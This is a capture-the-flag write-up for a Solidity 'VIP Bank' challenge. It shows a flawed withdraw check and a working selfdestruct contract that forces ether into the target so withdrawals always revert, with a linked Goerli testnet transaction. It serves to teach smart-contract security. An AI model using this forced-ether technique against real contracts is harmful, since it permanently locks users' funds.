### VIP Bank

Solution by 2pats

Objective: "At any cost, lock the VIP user balance forever into the contract."

Main vulnerabilities: 

The target contract's withdraw has an incorrectly designed require statement. All withdraws will revert if the contract's balance is over 0.5eth.

```
  function withdraw(uint _amount) public onlyVIP {
        require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
        (bool success,) = payable(msg.sender).call{value: _amount}("");
        balances[msg.sender] -= _amount;
        require(success, "Withdraw Failed!");
    }
```

Exploit: 

Forcefully add to the contract's balance by self destructing a contract of your own and specifying the target CTF contract as a recipient.

Take the example solution below: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Solution {
    address targetAddress = 0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2;
    function attack() public payable {
        address payable addr = payable(targetAddress);
        selfdestruct(addr);
    }
}
```

simply call the payable attack method with a value that would increase the contract balance to more than 0.5eth, as demonstrated similarly in my transaction here https://goerli.etherscan.io/tx/0xabf22269cb2dd3e3acf30252f43fd976b187cb54c6f0fb8037fa393c81585f46


